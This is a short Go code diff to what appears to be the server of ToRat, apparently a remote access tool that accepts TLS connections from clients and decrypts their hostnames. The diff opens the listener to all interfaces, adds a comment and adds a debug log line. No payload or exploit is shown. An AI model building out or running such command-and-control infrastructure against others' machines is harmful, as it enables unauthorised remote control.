@@ -14,7 +14,7 @@ import (
 	"github.com/lu4p/ToRat_server/crypto"
 )
 
-const port = "127.0.0.1:1337"
+const port = ":1337"
 
 var allClients []*client
 
@@ -25,6 +25,7 @@ type client struct {
 	Path     string
 }
 
+// Start runs the server
 func Start() {
 	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
 	if err != nil {
@@ -57,6 +58,7 @@ func accept(conn net.Conn) {
 		log.Println("Invalid Hostname", err)
 		return
 	}
+	log.Println("Len Hostname", len(encHostname))
 	hostname, err := crypto.DecAsym(encHostname)
 	if err != nil {
 		log.Println("Invalid Hostname", err)
